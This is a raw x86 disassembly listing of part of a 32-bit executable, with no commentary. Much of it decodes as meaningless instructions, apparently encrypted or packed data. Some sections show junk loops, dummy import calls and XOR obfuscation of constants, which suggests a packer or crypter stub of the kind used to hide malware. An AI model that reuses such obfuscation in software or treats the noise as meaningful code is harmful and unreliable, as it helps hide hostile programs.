  401819:	cmp    edx,DWORD PTR [edx]
  40181b:	xor    cl,BYTE PTR [eax+eiz*4-0x3e]
  40181f:	stc    
  401820:	iret   
  401821:	scas   al,BYTE PTR es:[edi]
  401822:	clc    
  401823:	pop    ds
  401824:	fnsave [eax+0x4]
  401827:	jg     0x401842
  401829:	out    dx,al
  40182a:	scas   al,BYTE PTR es:[edi]
  40182b:	ret    
  40182c:	sub    BYTE PTR [ecx],0xa5
  40182f:	push   edi
  401830:	xchg   edx,eax
  401831:	sub    BYTE PTR [edx+0x55c3073b],dh
  401837:	rcl    esp,1
  401839:	icebp  
  40183a:	hlt    
  40183b:	das    
  40183c:	and    al,0x17
  40183e:	test   DWORD PTR [eax-0x61],ecx
  401841:	or     DWORD PTR [edi-0x5379d6e4],esp
  401847:	test   DWORD PTR [edi+0x63630062],esp
  40184d:	retf   0x3a46
  401850:	aaa    
  401851:	repz jb 0x40185e
  401854:	mov    al,ds:0x9de626d1
  401859:	stos   DWORD PTR es:[edi],eax
  40185a:	jae    0x4017e7
  40185c:	popf   
  40185d:	ret    
  40185e:	cmp    al,0xa
  401860:	sbb    al,0x13
  401862:	cmp    DWORD PTR [esi+0x51],esi
  401865:	test   al,0xc4
  401867:	mov    ah,0xc3
  401869:	call   0x8fd3a38e
  40186e:	jge    0x40180b
  401870:	inc    edi
  401871:	add    DWORD PTR [edi+0x12],ebp
  401874:	in     eax,dx
  401875:	sub    edx,edi
  401877:	pop    edi
  401878:	mov    ecx,0x27b97dd8
  40187d:	dec    ebx
  40187e:	cmp    al,0x8d
  401880:	push   ebx
  401881:	ja     0x40189d
  401883:	sar    ebp,0x48
  401886:	dec    ecx
  401887:	xchg   esp,eax
  401888:	js     0x401852
  40188a:	cdq    
  40188b:	pop    ecx
  40188c:	daa    
  40188d:	loopne 0x401852
  40188f:	jb     0x40183a
  401891:	jo     0x40189a
  401893:	cmp    al,BYTE PTR [ebp+0x27]
  401896:	add    BYTE PTR [ebx+0x2a],0xa
  40189a:	loopne 0x4018d7
  40189c:	add    BYTE PTR [eax+0x2c],ah
  40189f:	sbb    cl,BYTE PTR [edi-0x74]
  4018a2:	inc    edx
  4018a3:	fist   DWORD PTR [edx-0x63]
  4018a6:	pop    ebx
  4018a7:	push   cs
  4018a8:	xor    al,0x4e
  4018aa:	shl    BYTE PTR [ecx],cl
  4018ac:	adc    al,0x48
  4018ae:	mov    ebp,0x831e89e
  4018b3:	mov    ?,WORD PTR [ecx]
  4018b5:	sar    dh,0xe6
  4018b8:	repnz and al,0xbb
  4018bb:	aaa    
  4018bc:	cdq    
  4018bd:	les    eax,FWORD PTR [ebx]
  4018bf:	mov    DWORD PTR [ecx+0x43373725],0x0
  4018c9:	add    cl,ch
  4018cb:	or     eax,0x8b000000
  4018d0:	sbb    eax,0x433737
  4018d5:	inc    ebx
  4018d6:	mov    DWORD PTR ds:0x433737,ebx
  4018dc:	cmp    DWORD PTR ds:0x433737,0x1c
  4018e3:	jae    0x401910
  4018e9:	cmp    DWORD PTR ds:0x433737,0x23
  4018f0:	jne    0x401901
  4018f6:	push   0x6ff2
  4018fb:	call   DWORD PTR ds:0x41228c
  401901:	jmp    0x4018cf
  401906:	mov    DWORD PTR ds:0x43372b,0x436b
  401910:	mov    DWORD PTR [ebp-0x38],eax
  401913:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40191a:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401921:	or     DWORD PTR ds:0x433677,edx
  401927:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40192e:	add    eax,DWORD PTR ds:0x43366b
  401934:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40193b:	xor    DWORD PTR ds:0x43372f,ecx
  401941:	mov    eax,DWORD PTR [ebp-0x10]
  401944:	xor    ebx,DWORD PTR ds:0x4336f3
  40194a:	xor    eax,esi
  40194c:	add    eax,edi
  40194e:	mov    DWORD PTR [ebp-0xc],eax
  401951:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401958:	sbb    ebx,ebx
  40195a:	mov    BYTE PTR [ebp-0x11],0x67
  40195e:	sub    DWORD PTR ds:0x433667,0x1011
  401968:	mov    eax,DWORD PTR [ebp-0x10]
  40196b:	xor    eax,esi
  40196d:	add    eax,edi
  40196f:	sbb    DWORD PTR ds:0x433633,0x6b1e
  401979:	mov    DWORD PTR [ebp-0xc],eax
  40197c:	mov    eax,DWORD PTR [ebp-0x3c]
  40197f:	xor    eax,esi
  401981:	xor    DWORD PTR ds:0x43366f,0x46ad
  40198b:	add    eax,edi
  40198d:	mov    DWORD PTR [ebp-0x34],eax
  401990:	mov    eax,DWORD PTR [ebp-0x44]
  401993:	mov    DWORD PTR ds:0x433667,0x12
  40199d:	cmp    DWORD PTR ds:0x433667,0x0
  4019a4:	je     0x4019f8
  4019aa:	cmp    DWORD PTR ds:0x433667,0x7
  4019b1:	jne    0x4019c2
  4019b7:	push   0x433767
  4019bc:	call   DWORD PTR ds:0x4121b8
  4019c2:	cmp    DWORD PTR ds:0x433667,0x8
  4019c9:	jne    0x4019dc
  4019cf:	mov    ebx,DWORD PTR ds:0x433667
  4019d5:	dec    ebx
  4019d6:	mov    DWORD PTR ds:0x433667,ebx
  4019dc:	mov    ebx,DWORD PTR ds:0x433667
  4019e2:	dec    ebx
  4019e3:	mov    DWORD PTR ds:0x433667,ebx
  4019e9:	jmp    0x40199d
  4019ee:	and    DWORD PTR ds:0x433613,0x446b
  4019f8:	xor    eax,esi
  4019fa:	add    eax,edi
  4019fc:	not    ebx
  4019fe:	mov    DWORD PTR [ebp-0x30],eax
  401a01:	sub    ebx,DWORD PTR ds:0x4336f7
  401a07:	mov    eax,DWORD PTR [ebp-0x28]
  401a0a:	add    ecx,ecx
  401a0c:	xor    eax,esi
  401a0e:	and    DWORD PTR ds:0x4336eb,0x0
  401a18:	jmp    0x401a2a
  401a1d:	mov    ebx,DWORD PTR ds:0x4336eb
  401a23:	inc    ebx
  401a24:	mov    DWORD PTR ds:0x4336eb,ebx
  401a2a:	cmp    DWORD PTR ds:0x4336eb,0x18
  401a31:	jae    0x401f27
  401a37:	cmp    DWORD PTR ds:0x4336eb,0xa
  401a3e:	jne    0x401a4f
  401a44:	push   0x1a57
  401a49:	call   DWORD PTR ds:0x412350
  401a4f:	cmp    DWORD PTR ds:0x4336eb,0x9
  401a56:	jne    0x401a6b
  401a5c:	xor    ebx,ebx
  401a5e:	xor    ebx,DWORD PTR ds:0x4336eb
  401a64:	inc    ebx
  401a65:	mov    DWORD PTR ds:0x4336eb,ebx
  401a6b:	jmp    0x401a1d
  401a70:	mov    DWORD PTR ds:0x433617,0x13
  401a7a:	cmp    DWORD PTR ds:0x433617,0x0
  401a81:	je     0x401f27
  401a87:	cmp    DWORD PTR ds:0x433617,0xa
  401a8e:	jne    0x401a9f
  401a94:	push   0x764e
  401a99:	call   DWORD PTR ds:0x412290
  401a9f:	cmp    DWORD PTR ds:0x433617,0xb
  401aa6:	jne    0x401abb
  401aac:	xor    ecx,ecx
  401aae:	xor    ecx,DWORD PTR ds:0x433617
  401ab4:	dec    ecx
  401ab5:	mov    DWORD PTR ds:0x433617,ecx
  401abb:	mov    ecx,DWORD PTR ds:0x433617
  401ac1:	dec    ecx
  401ac2:	mov    DWORD PTR ds:0x433617,ecx
  401ac8:	jmp    0x401a7a
  401acd:	and    DWORD PTR ds:0x433677,0x0
  401ad7:	jmp    0x401ae9
  401adc:	mov    ecx,DWORD PTR ds:0x433677
  401ae2:	inc    ecx
  401ae3:	mov    DWORD PTR ds:0x433677,ecx
  401ae9:	cmp    DWORD PTR ds:0x433677,0x1c
  401af0:	jae    0x401f27
  401af6:	cmp    DWORD PTR ds:0x433677,0x1d
  401afd:	jne    0x401b0e
  401b03:	push   0x3c99
  401b08:	call   DWORD PTR ds:0x412294
  401b0e:	jmp    0x401adc
  401b13:	xor    DWORD PTR ds:0x433677,ecx
  401b19:	jmp    0x401f27
  401b1e:	mov    cl,0x40
  401b20:	(bad)  
  401b21:	mul    DWORD PTR es:[ecx+0x73ea5171]
  401b28:	cmp    edx,DWORD PTR [ebx+0x2f]
  401b2b:	push   ebp
  401b2c:	mov    DWORD PTR [edx+0x5c],ecx
  401b2f:	jns    0x401baf
  401b31:	jle    0x401ba2
  401b33:	jge    0x401bb3
  401b35:	jle    0x401b21
  401b37:	jbe    0x401af0
  401b39:	leave  
  401b3a:	inc    edx
  401b3b:	dec    ecx
  401b3c:	sbb    bl,BYTE PTR ds:0x4b9e3b38
  401b42:	sahf   
  401b43:	cmp    BYTE PTR [ebp+edx*1+0x4b],dl
  401b47:	stos   DWORD PTR es:[edi],eax
  401b48:	dec    ebp
  401b49:	fadd   DWORD PTR [eax+edi*4+0x5e]
  401b4d:	popf   
  401b4e:	add    bl,BYTE PTR [eax+edi*1]
  401b51:	add    ecx,DWORD PTR [esi]
  401b53:	jnp    0x401b3f
  401b55:	shl    DWORD PTR [ebx-0x14905868],0x34
  401b5c:	sub    eax,DWORD PTR [edi-0x36]
  401b5f:	stc    
  401b60:	mov    al,ds:0xdd627269
  401b65:	mov    dh,0xb0
  401b67:	mov    eax,0xa17c851
  401b6c:	sti    
  401b6d:	or     ah,ch
  401b6f:	call   0xc84e:0xecb00b8c
  401b76:	push   esi
  401b77:	xchg   esp,eax
  401b78:	pop    ecx
  401b79:	repz and al,0xd6
  401b7c:	test   BYTE PTR [edx+0x69c4411b],0x70
  401b83:	xlat   BYTE PTR ds:[ebx]
  401b84:	ss ds and eax,0x96b0d658
  401b8b:	cs js  0x401b6c
  401b8e:	sbb    al,0xc4
  401b90:	in     al,0x71
  401b92:	test   BYTE PTR [edi],dh
  401b94:	mov    BYTE PTR [ecx+0x7151dd79],dh
  401b9a:	lds    edx,FWORD PTR [edi-0x4b]
  401b9d:	or     ebp,DWORD PTR [eax-0x7a]
  401ba0:	retf   
  401ba1:	mov    fs,WORD PTR [esi-0xe]
  401ba4:	cdq    
  401ba5:	aad    0x81
  401ba7:	mov    WORD PTR [ebx-0x5d],cs
  401baa:	or     DWORD PTR [ecx],eax
  401bac:	mov    al,ds:0x9b54eec0
  401bb1:	add    bl,BYTE PTR [edi+0x34770a9]
  401bb7:	daa    
  401bb8:	in     eax,0x96
  401bba:	test   ecx,edi
  401bbc:	pop    ds
  401bbd:	retf   
  401bbe:	dec    ebp
  401bbf:	dec    edi
  401bc0:	in     al,0x64
  401bc2:	ins    BYTE PTR es:[edi],dx
  401bc3:	js     0x401c30
  401bc5:	arpl   WORD PTR [edx],di
  401bc7:	rol    DWORD PTR [edi+0x7128f494],0xef
  401bce:	jp     0x401bcc
  401bd0:	sahf   
  401bd1:	add    BYTE PTR [edx+0x190cd058],bl
  401bd7:	sub    eax,0xe3860a1
  401bdc:	jle    0x401c54
  401bde:	push   0x90709cf1
  401be3:	retf   0x3e6a
  401be6:	repz mov dl,cl
  401be9:	jmp    0xcc380360
  401bee:	fs adc eax,0x225e9ac9
  401bf4:	ss jge 0x401c22
  401bf7:	aaa    
  401bf8:	jns    0x401c43
  401bfa:	scas   eax,DWORD PTR es:[edi]
  401bfb:	or     BYTE PTR ds:0xc9ce181b,0x2d
  401c02:	cmc    
  401c03:	xor    eax,0x19a6ccdc
  401c08:	mov    edx,0x3160c629
  401c0d:	repnz xor al,0xe5
  401c10:	adc    al,0x55
  401c12:	dec    esi
  401c13:	cmp    BYTE PTR [edx+0x4516cc2f],bh
  401c19:	fisttp WORD PTR [ebx]
  401c1b:	neg    ebx
  401c1d:	inc    edi
  401c1e:	xchg   edi,eax
  401c1f:	test   BYTE PTR [edi],cl
  401c21:	and    DWORD PTR [ecx],edx
  401c23:	mov    ch,0x13
  401c25:	pop    es
  401c26:	sbb    eax,DWORD PTR [eax+0x3021486c]
  401c2c:	jl     0x401c3f
  401c2e:	stc    
  401c2f:	test   eax,0x31edfd19
  401c34:	dec    eax
  401c35:	lea    edx,[edx+0x20aac98e]
  401c3b:	ret    
  401c3c:	cld    
  401c3d:	fist   DWORD PTR [ebx+ecx*8+0x40]
  401c41:	fidivr DWORD PTR [ebx+0xa]
  401c44:	jnp    0x401c17
  401c46:	fld    DWORD PTR [ebx+eax*8+0xc9b8cdd]
  401c4d:	cmp    eax,0x47d2c972
  401c52:	imul   eax,DWORD PTR [edx-0x72267a6d],0x9dfaf975
  401c5c:	dec    edi
  401c5d:	sti    
  401c5e:	fdiv   DWORD PTR [ebp+0x63552451]
  401c64:	jns    0x401c5a
  401c66:	ins    BYTE PTR es:[edi],dx
  401c67:	or     eax,DWORD PTR [esi]
  401c69:	sbb    BYTE PTR [esi+ebp*1-0x4d11a15e],ah
  401c70:	ins    DWORD PTR es:[edi],dx
  401c71:	(bad)  
  401c72:	sub    al,0x4b
  401c74:	test   eax,0xc0f5ab3e
  401c79:	pop    ebx
  401c7a:	jecxz  0x401ce6
  401c7c:	adc    eax,0x8294c1f8
  401c81:	sub    al,0x29
  401c83:	repz lock xchg edx,eax
  401c86:	push   ecx
  401c87:	lea    eax,[edx+0x382552e5]
  401c8d:	xor    DWORD PTR [ecx+0x6dc708d9],ebx
  401c93:	out    dx,al
  401c94:	cs (bad) 
  401c96:	test   BYTE PTR [eax+ebx*8+0x26],0xdc
  401c9b:	or     eax,0x6bb94274
  401ca0:	push   ebp
  401ca1:	add    BYTE PTR [ebp-0x7e257bbf],ch
  401ca7:	outs   dx,DWORD PTR ds:[esi]
  401ca8:	shr    BYTE PTR [ebx-0x47],0x26
  401cac:	add    ch,BYTE PTR ss:[edi-0x2d73c627]
  401cb3:	pop    es
  401cb4:	xchg   esi,eax
  401cb5:	pop    ebx
  401cb6:	loop   0x401c7f
  401cb8:	xchg   edi,eax
  401cb9:	sub    edx,ebp
  401cbb:	mov    edi,0x70a593c8
  401cc0:	daa    
  401cc1:	stos   DWORD PTR es:[edi],eax
  401cc2:	repnz fwait
  401cc4:	xchg   esp,eax
  401cc5:	out    dx,al
  401cc6:	into   
  401cc7:	push   es
  401cc8:	ins    DWORD PTR es:[edi],dx
  401cc9:	xchg   ecx,eax
  401cca:	ret    0x9174
  401ccd:	addr16 mov eax,0xb72ceabf
  401cd3:	jge    0x401cd7
  401cd5:	push   0xfffffff2
  401cd7:	(bad)  
  401cd8:	in     al,dx
  401cd9:	in     eax,0xa5
  401cdb:	cmp    al,0x2
  401cdd:	pop    es
  401cde:	dec    esp
  401cdf:	cld    
  401ce0:	dec    ebx
  401ce1:	gs mov ebx,0x38713cef
  401ce7:	stos   BYTE PTR es:[edi],al
  401ce8:	push   cs
  401ce9:	jo     0x401cb9
  401ceb:	jae    0x401ccf
  401ced:	cmp    dh,ch
  401cef:	jg     0x401d56
  401cf1:	pop    ebp
  401cf2:	mov    esi,0x6ae53cb6
  401cf7:	ja     0x401caa
  401cf9:	jg     0x401d79
  401cfb:	mov    dl,0x31
  401cfd:	sbb    esp,edx
  401cff:	lea    ebp,[edx+0x75b26087]
  401d05:	mov    ds:0x1e2615f1,al
  401d0a:	mov    edx,0xc4d6851d
  401d0f:	nop
  401d10:	and    al,0x14
  401d12:	fidivr WORD PTR [ebp+0x42]
  401d15:	out    0x98,al
  401d17:	int3   
  401d18:	mov    al,0x35
  401d1a:	sub    dl,BYTE PTR [ebx+0x17a082ac]
  401d20:	in     al,0x1f
  401d22:	mov    esp,DWORD PTR ds:0xb7c36293
  401d28:	loope  0x401ccc
  401d2a:	addr16 push ss
  401d2c:	jecxz  0x401d7d
  401d2e:	cmp    cl,bl
  401d30:	loope  0x401d32
  401d32:	test   al,0x3b
  401d34:	sbb    al,0x1a
  401d36:	int    0x2f
  401d38:	outs   dx,DWORD PTR ds:[esi]
  401d39:	dec    edx
  401d3a:	mov    al,ds:0x1e4b74
  401d3f:	lods   eax,DWORD PTR ds:[esi]
  401d40:	or     BYTE PTR [eax],al
  401d42:	or     dl,BYTE PTR [ecx]
  401d44:	xchg   esp,eax
  401d45:	inc    ecx
  401d46:	xor    al,0x37
  401d48:	jecxz  0x401d9b
  401d4a:	pop    esi
  401d4b:	aam    0x13
  401d4d:	sbb    al,0xc5
  401d4f:	mov    eax,ds:0xc8f6e26a
  401d54:	sahf   
  401d55:	int3   
  401d56:	or     ch,BYTE PTR [ebp-0x4390b2f]
  401d5c:	neg    DWORD PTR [esi]
  401d5e:	mul    DWORD PTR [esi+ebp*4-0x7bcc5af0]
  401d65:	cmp    bl,BYTE PTR [esi+0x2411b5bf]
  401d6b:	test   bl,0x5d
  401d6e:	aaa    
  401d6f:	retf   0xea55
  401d72:	add    eax,0x549068e
  401d77:	and    BYTE PTR [edx],ah
  401d79:	imul   ebx,DWORD PTR [ebx+0x1bd22caa],0x11
  401d80:	data16 sbb ch,ah
  401d83:	popa   
  401d84:	mov    esi,0x634971f7
  401d89:	and    al,0x22
  401d8b:	mov    ds:0x44dae002,al
  401d90:	fsub   QWORD PTR [ecx-0xe0bcbf4]
  401d96:	mov    ah,0xd7
  401d98:	add    BYTE PTR [ebx+ebp*1],bl
  401d9b:	pop    ds
  401d9c:	arpl   WORD PTR [ebp-0x49babd58],dx
  401da2:	pop    ecx
  401da3:	cmp    al,0x8f
  401da5:	jns    0x401e09
  401da7:	pop    ds
  401da8:	push   edx
  401da9:	test   DWORD PTR [esi+0x8],esi
  401dac:	push   edx
  401dad:	lds    esp,FWORD PTR [esi]
  401daf:	sar    bl,0xc
  401db2:	jns    0x401d70
  401db4:	inc    ecx
  401db5:	cmp    al,0x64
  401db7:	and    eax,0xd1bef074
  401dbc:	mov    ch,0x91
  401dbe:	dec    edi
  401dbf:	push   ds
  401dc0:	add    ecx,DWORD PTR [edi]
  401dc2:	out    0x2c,eax
  401dc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401dc5:	jbe    0x401d65
  401dc7:	and    dl,BYTE PTR [eax+0xa]
  401dca:	rol    BYTE PTR [ebx+0x747f6daf],1
  401dd0:	out    dx,eax
  401dd1:	adc    al,0x62
  401dd3:	push   edi
  401dd4:	clc    
  401dd5:	pop    ds
  401dd6:	(bad)  
  401dd7:	retf   
  401dd8:	out    dx,eax
  401dd9:	addr16 xchg esi,eax
  401ddb:	xchg   edx,eax
  401ddc:	jge    0x401e45
  401dde:	push   es
  401ddf:	imul   esp,DWORD PTR [ebx-0x675c9c20],0x9b3b20f8
  401de9:	mov    WORD PTR [eax],?
  401deb:	mov    ebx,0xa0718ee6
  401df0:	bound  ecx,QWORD PTR [ebx-0x37]
  401df3:	pop    ebp
  401df4:	in     eax,dx
  401df5:	(bad)  
  401df6:	popf   
  401df7:	mov    bh,BYTE PTR [esi]
  401df9:	stc    
  401dfa:	jnp    0x401e6a
  401dfc:	arpl   WORD PTR [esi+0x46],sp
  401dff:	imul   eax,DWORD PTR [edi],0x8d6153ac
  401e05:	jnp    0x401dbf
  401e07:	sub    dh,ch
  401e09:	jmp    0x13b2944a
  401e0e:	aam    0x97
  401e10:	dec    esp
  401e11:	jae    0x401dc0
  401e13:	sub    bl,BYTE PTR ds:0xe38111f9
  401e19:	push   es
  401e1a:	adc    BYTE PTR [esi+0x430c055b],bl
  401e20:	dec    esi
  401e21:	jge    0x401dbb
  401e23:	shl    BYTE PTR [edi-0x4d2ea4a7],1
  401e29:	sbb    bl,BYTE PTR [esi]
  401e2b:	pop    ebx
  401e2c:	adc    BYTE PTR [esi-0x30977669],cl
  401e32:	add    DWORD PTR [esi-0x75888438],0x74c5045a
  401e3c:	stos   BYTE PTR es:[edi],al
  401e3d:	lods   eax,DWORD PTR ds:[esi]
  401e3e:	mov    ebp,ebp
  401e40:	and    ecx,DWORD PTR [eax-0x25664617]
  401e46:	jge    0x401ea2
  401e48:	nop
  401e49:	les    edi,FWORD PTR [eax]
  401e4b:	repnz fcomi st,st(6)
  401e4e:	cmp    edx,DWORD PTR [edx]
  401e50:	cmp    al,0x2d
  401e52:	adc    ebx,edi
  401e54:	gs jne 0x401eb7
  401e57:	adc    al,0xc4
  401e59:	sub    eax,0x1a1ee21c
  401e5e:	(bad)  
  401e5f:	jge    0x401e0b
  401e61:	cmp    ebp,DWORD PTR [edi+0x34]
  401e64:	sub    eax,0xc1febdbc
  401e69:	sub    cl,ah
  401e6b:	add    ch,BYTE PTR [edi+0x787d3aa]
  401e71:	icebp  
  401e72:	popa   
  401e73:	or     BYTE PTR [ebx],cl
  401e75:	mov    esp,edi
  401e77:	dec    edi
  401e78:	jo     0x401ee8
  401e7a:	in     al,0x8b
  401e7c:	out    0xcf,al
  401e7e:	(bad)  
  401e7f:	mov    cl,0x7
  401e81:	adc    eax,0x573c726d
  401e86:	rcr    BYTE PTR [esi-0x21],cl
  401e89:	sbb    BYTE PTR [edi],0x87
  401e8c:	stc    
  401e8d:	aaa    
  401e8e:	retf   
  401e8f:	inc    edi
  401e90:	(bad)  
  401e91:	and    BYTE PTR [edi+ebx*8-0x1d905de],dl
  401e98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e99:	aam    0x8c
  401e9b:	pop    ecx
  401e9c:	xchg   edi,eax
  401e9d:	daa    
  401e9e:	xor    BYTE PTR [edx],dh
  401ea0:	fmul   QWORD PTR [ebp+0x25]
  401ea3:	dec    esi
  401ea4:	call   0xf861:0xe3f8fbdf
  401eab:	or     DWORD PTR [edi+ebp*1-0x1a],eax
  401eaf:	cmp    BYTE PTR [ecx+0x78],cl
  401eb2:	mov    edx,0x12d4c345
  401eb7:	imul   esp,DWORD PTR [edi],0x3a895476
  401ebd:	ret    0x325c
  401ec0:	imul   edi,edx,0x699561c4
  401ec6:	(bad)  
  401ec7:	cld    
  401ec8:	mov    al,ds:0x958a22b9
  401ecd:	xchg   esi,eax
  401ece:	ret    
  401ecf:	pop    ss
  401ed0:	sub    cl,dh
  401ed2:	jecxz  0x401e74
  401ed4:	dec    ebp
  401ed5:	push   es
  401ed6:	aas    
  401ed7:	imul   ecx,DWORD PTR ds:0xc1ea4871,0x43d6609b
  401ee1:	inc    ebx
  401ee2:	mov    dl,0x98
  401ee4:	rol    BYTE PTR [esp],1
  401ee7:	mov    esi,0xdd80c164
  401eec:	mov    eax,ds:0x8ccfe23a
  401ef1:	aad    0x97
  401ef3:	mov    ecx,edi
  401ef5:	(bad)  
  401ef6:	outs   dx,BYTE PTR ds:[esi]
  401ef7:	xchg   DWORD PTR [esp+ebp*8-0x58224916],edi
  401efe:	out    0xf5,eax
  401f00:	mov    BYTE PTR [esi-0x5fae4632],al
  401f06:	int3   
  401f07:	sbb    eax,0x956f66cf
  401f0c:	sbb    al,0xde
  401f0e:	pop    ss
  401f0f:	xor    DWORD PTR [esi-0x170b2db1],ebx
  401f15:	(bad)  
  401f16:	cmp    bl,BYTE PTR [ebp-0x19]
  401f19:	scas   al,BYTE PTR es:[edi]
  401f1a:	or     ebx,DWORD PTR [ebx]
  401f1c:	mov    dh,0x3a
  401f1e:	int    0xbb
  401f20:	adc    cl,0xca
  401f23:	fucomip st,st(3)
  401f25:	aas    
  401f26:	lsl    eax,di
  401f29:	mov    ebx,DWORD PTR ds:0x43370b
  401f2f:	mov    ecx,DWORD PTR ds:0x433757
  401f35:	sub    ecx,ebx
  401f37:	add    ebx,DWORD PTR [ebx+ecx*1]
  401f3a:	mov    DWORD PTR [ebp-0x2c],eax
  401f3d:	mov    ebx,DWORD PTR ds:0x433747
  401f43:	mov    ebx,DWORD PTR [ebx]
  401f45:	xor    DWORD PTR ds:0x43361b,ebx
  401f4b:	jmp    0x402359
  401f50:	lahf   
  401f51:	in     al,dx
  401f52:	leave  
  401f53:	dec    DWORD PTR [ecx-0x65]
  401f56:	imul   ebp,esp,0xaa49c393
  401f5c:	scas   eax,DWORD PTR es:[edi]
  401f5d:	push   ds
  401f5e:	scas   eax,DWORD PTR es:[edi]
  401f5f:	mov    cl,BYTE PTR [ebp+0x5]
  401f62:	jle    0x401fe2
  401f64:	outs   dx,DWORD PTR ds:[esi]
  401f65:	jge    0x401fe5
  401f67:	jle    0x401f5e
  401f69:	sti    
  401f6a:	stc    
  401f6b:	imul   bh
  401f6d:	add    DWORD PTR [ebp-0x5],eax
  401f70:	stc    
  401f71:	inc    BYTE PTR [edx-0xa23451d]
  401f77:	mov    bl,0x70
  401f79:	xlat   BYTE PTR ds:[ebx]
  401f7a:	rol    bh,cl
  401f7c:	pop    ss
  401f7d:	(bad)  
  401f7e:	scas   al,BYTE PTR es:[edi]
  401f7f:	fstp   QWORD PTR [esi-0x3f]
  401f82:	pushf  
  401f83:	xor    eax,0x6e231b0a
  401f88:	shl    ebp,0x7b
  401f8b:	(bad)  
  401f8c:	ficom  WORD PTR [edx-0x15]
  401f8f:	dec    edx
  401f90:	jo     0x401f30
  401f92:	imul   edi,ecx,0x77061cbd
  401f98:	xchg   edx,eax
  401f99:	pop    edi
  401f9a:	aas    
  401f9b:	or     BYTE PTR [esi+0x56],dh
  401f9e:	inc    edi
  401f9f:	sti    
  401fa0:	ins    DWORD PTR es:[edi],dx
  401fa1:	out    dx,eax
  401fa2:	mov    DWORD PTR [esp+edi*1+0x14787fbe],edi
  401fa9:	xor    eax,0x95885dbc
  401fae:	retf   
  401faf:	cdq    
  401fb0:	jbe    0x401fc6
  401fb2:	cmp    BYTE PTR [eax-0x63],dh
  401fb5:	push   ss
  401fb6:	and    eax,0xf80178d4
  401fbb:	ins    DWORD PTR es:[edi],dx
  401fbc:	(bad)  
  401fbe:	popf   
  401fbf:	pminsw mm4,QWORD PTR [ebp-0x6a94961e]
  401fc6:	lds    esi,FWORD PTR [esi+0x7c695f3c]
  401fcc:	lods   eax,DWORD PTR ds:[esi]
  401fcd:	sub    eax,0xa98134db
  401fd2:	and    al,ch
  401fd4:	js     0x40201a
  401fd6:	sahf   
  401fd7:	push   ecx
  401fd8:	daa    
  401fd9:	repz ds into 
  401fdc:	sub    BYTE PTR [esi+edi*1],dl
  401fdf:	dec    esi
  401fe0:	outs   dx,BYTE PTR ds:[esi]
  401fe1:	inc    ecx
  401fe2:	and    BYTE PTR [ebx+0xb],al
  401fe5:	les    edx,FWORD PTR [esi-0x1f5b7632]
  401feb:	jnp    0x402053
  401fed:	jmp    0x8678:0xf7bd3481
  401ff4:	cdq    
  401ff5:	retf   
  401ff6:	or     dl,cl
  401ff8:	dec    eax
  401ff9:	jmp    0x9e064abe
  401ffe:	add    BYTE PTR [ecx],al
  402000:	jecxz  0x401fb7
  402002:	dec    esp
  402003:	dec    eax
  402004:	xlat   BYTE PTR ds:[ebx]
  402005:	and    al,0x58
  402007:	gs sub eax,0xbbc086b4
  40200d:	aad    0xf1
  40200f:	pushf  
  402010:	add    DWORD PTR [ebx-0x30],ebp
  402013:	(bad)  
  402014:	mov    WORD PTR [edx-0x22],gs
  402017:	in     al,0xe4
  402019:	fisttp QWORD PTR [ebp-0x7c04ad3e]
  40201f:	pusha  
  402020:	popa   
  402021:	ret    0x8fd9
  402024:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402025:	mov    edx,0xe07354e7
  40202a:	fs jle 0x402073
  40202d:	mov    esp,0xf5d195e
  402032:	or     BYTE PTR [ebp-0x78],al
  402035:	test   eax,0x46c9d1a7
  40203a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40203b:	(bad)  
  40203c:	pop    ds
  40203d:	int    0x59
  40203f:	jae    0x402049
  402041:	mov    edx,0x16ddfd5b
  402046:	cmp    DWORD PTR [edi+ebx*2],ebx
  402049:	popa   
  40204a:	xchg   esp,eax
  40204b:	call   0x7f97cba1
  402050:	cmp    eax,0x642b907f
  402055:	push   esi
  402056:	dec    DWORD PTR ds:0xe3917dd8
  40205c:	pushf  
  40205d:	mov    eax,ds:0x44161593
  402062:	das    
  402063:	ficom  WORD PTR [ecx-0x68]
  402066:	ss (bad) 
  402068:	or     edx,esi
  40206a:	(bad)  
  40206b:	dec    ecx
  40206c:	retf   
  40206d:	adc    eax,0xad74190e
  402072:	es add eax,0xc6a54e27
  402078:	mov    BYTE PTR [ecx-0x648bd0e7],bh
  40207e:	aas    
  40207f:	sub    eax,0x233c5425
  402084:	repnz dec ebp
  402087:	sti    
  402088:	lahf   
  402089:	jo     0x4020cd
  40208b:	sub    BYTE PTR [eax+0x78],bl
  40208e:	push   edi
  40208f:	sbb    ch,dh
  402091:	lahf   
  402092:	dec    eax
  402093:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402094:	inc    esi
  402095:	dec    ebx
  402096:	mov    ch,0x82
  402098:	es dec ecx
  40209a:	or     al,0x61
  40209c:	adc    eax,0x76d6c4cf
  4020a1:	(bad)  
  4020a2:	pop    esi
  4020a3:	add    ah,BYTE PTR [ebp+0x8]
  4020a6:	cmp    BYTE PTR [esi],ah
  4020a8:	std    
  4020a9:	sbb    al,0xfa
  4020ab:	js     0x402117
  4020ad:	pop    edx
  4020ae:	mov    bh,0x62
  4020b0:	gs xchg esp,eax
  4020b2:	mov    ah,0xc1
  4020b4:	(bad)
  4020ba:	push   ebx
  4020bb:	jne    0x402040
  4020bd:	test   eax,0xc4739071
  4020c2:	mov    cl,0x45
  4020c4:	enter  0xfaf8,0x70
  4020c8:	js     0x402090
  4020ca:	jns    0x402111
  4020cc:	repnz add eax,0xe328e7d3
  4020d2:	rcr    cl,0x86
  4020d5:	idiv   edi
  4020d7:	daa    
  4020d8:	pop    ecx
  4020d9:	aam    0x7f
  4020db:	call   0x38742ab4
  4020e0:	mov    BYTE PTR [ebp-0x13bf0d5e],al
  4020e6:	push   0x4eb3ccea
  4020eb:	jl     0x402078
  4020ed:	pop    esi
  4020ee:	cmp    eax,esi
  4020f0:	mov    dh,0xe3
  4020f2:	pushf  
  4020f3:	fwait
  4020f4:	jp     0x4020bb
  4020f6:	jg     0x4020a7
